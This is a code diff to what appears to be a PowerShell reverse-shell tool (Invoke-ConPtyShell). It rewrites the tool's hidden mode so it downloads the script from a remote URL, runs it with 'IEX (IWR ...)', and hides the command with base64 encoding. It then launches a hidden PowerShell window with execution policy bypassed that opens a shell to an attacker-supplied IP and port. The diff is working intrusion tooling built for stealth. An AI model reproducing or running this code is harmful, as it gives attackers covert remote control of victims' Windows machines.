@@ -32,31 +32,27 @@ function Invoke-ConPtyShell
     )
     
     if ($Hidden) {
-        # Save current script to temp file for the new process to use
-        $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+        # Get the full URL content to pass to the new process
+        $scriptUrl = "https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1"
         
-        # Get the current function's content
-        $functionContent = Get-Content Function:\Invoke-ConPtyShell
-        $fullScript = @"
-`$Source = @'
-$Source
-'@
-$functionContent
-Invoke-ConPtyShell -RemoteIp '$RemoteIp' -RemotePort '$RemotePort' -Rows '$Rows' -Cols '$Cols' -CommandLine '$CommandLine'
-"@
+        # Create the command that the new process will execute
+        $newCommand = "IEX (IWR '$scriptUrl' -UseBasicParsing); Invoke-ConPtyShell -RemoteIp '$RemoteIp' -RemotePort '$RemotePort' -Rows '$Rows' -Cols '$Cols' -CommandLine '$CommandLine'"
         
-        $fullScript | Out-File -FilePath $tempScript -Force
+        # Encode the command to avoid issues with special characters
+        $encodedCommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($newCommand))
         
-        # Launch new hidden process
-        Start-Process powershell.exe -ArgumentList "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
+        # Start a completely new hidden PowerShell process
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo.FileName = "powershell.exe"
+        $process.StartInfo.Arguments = "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand $encodedCommand"
+        $process.StartInfo.UseShellExecute = $true
+        $process.StartInfo.CreateNoWindow = $true
+        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $process.Start() | Out-Null
         
-        # Wait briefly then clean up
-        Start-Sleep -Seconds 3
-        Remove-Item $tempScript -Force
-        
-        # Exit current session
-        Write-Host "Shell moved to background. You can close this window."
-        exit
+        Write-Host "Hidden reverse shell spawned in new process. You may close this window."
+        # Don't use exit - let the current process continue or let user close it
+        return
     }
     
     if( $PSBoundParameters.ContainsKey('Upgrade') ) {
@@ -1578,7 +1574,6 @@ public static class ConPtyShellMainClass
         return output;
     }
 }
-
 
 class MainClass
 {
